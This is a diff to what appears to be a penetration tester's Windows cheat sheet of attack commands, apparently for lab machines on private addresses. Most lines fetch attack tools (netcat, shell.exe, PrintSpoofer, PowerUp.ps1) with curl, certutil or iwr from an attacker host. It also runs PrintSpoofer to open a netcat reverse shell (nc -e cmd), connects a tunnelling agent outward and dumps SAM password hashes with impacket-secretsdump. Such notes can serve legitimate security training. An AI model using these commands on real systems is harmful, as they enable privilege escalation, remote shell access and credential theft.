@@ -3,7 +3,7 @@ curl.exe http://192.168.45.206:8000/spoofer.exe -o spoofer.exe
 curl.exe http://192.168.45.224/nc.exe -o nc.exe
 
 curl.exe http://192.168.45.224/agent.exe -o agent.exe
-.\agent.exe -connect 192.168.45.224:9001 -ignore-cert
+.\agent.exe -connect 192.168.45.224:11601 -ignore-cert
 
 curl.exe http://192.168.45.224/shell.exe -o \users\public\shell.exe 
 
@@ -19,7 +19,7 @@ curl.exe http://192.168.45.224:8000/god.exe -o god.exe
 
 curl.exe http://192.168.45.224/PrintSpoofer64.exe -o spoofer.exe
 
-.\spoofer.exe -c ".\nc.exe 10.10.161.147 443 -e cmd"
+.\spoofer.exe -c ".\nc.exe 192.168.45.224 443 -e cmd"
 
 certutil.exe -f -split -urlcache http://10.10.161.147/nc.exe
 
@@ -71,6 +71,9 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 Get-LocalGroupMember -Group 'Administrators'
 systeminfo | findstr /B "Domain" 
 
+iwr -uri http://192.168.45.24/PowerUp.ps1 -Outfile PowerUp.ps1
+
+https://powersploit.readthedocs.io/en/latest/Privesc/
 
 
 
